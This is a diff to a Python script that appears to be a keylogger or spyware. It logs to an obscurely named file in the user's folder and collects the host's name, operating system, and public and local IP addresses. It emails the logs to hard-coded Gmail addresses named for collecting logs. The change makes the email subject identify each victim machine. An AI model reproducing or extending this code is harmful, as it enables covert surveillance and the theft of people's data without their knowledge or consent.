@@ -4,6 +4,7 @@ import os
 import stat
 import smtplib
 import socket
+import platform
 from requests import get
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -48,12 +49,12 @@ def sendmail(sender, to, subject, file):
 user = os.getlogin()
 
 def public_ip():    
-    public_ip = get('https://api.ipify.org').content.decode('utf8')
-    return public_ip
+    public = get('https://api.ipify.org').content.decode('utf8')
+    return public
 
 def local_ip():
-    local_ip = socket.gethostbyname(socket.gethostname())
-    return local_ip
+    local= socket.gethostbyname(socket.gethostname())
+    return local
 
 # Get the current users name
 user = os.getlogin()
@@ -74,10 +75,7 @@ def checkIfHidden(file):
 
 # For better cross compatibility, log file is created in Documents
 log = f"C:\\Users\\{user}\\xc7dysLal.txt"
-
-local = local_ip()
-public = public_ip()
-subject = f'Log from {public} / {local} Computer'
+subject = f'Log from {platform.node()} ({platform.system()}) IP: {public_ip()}{local_ip()}'
 to = 'loglogsnd@gmail.com'
 sender = 'insanelogcompile@gmail.com'
 
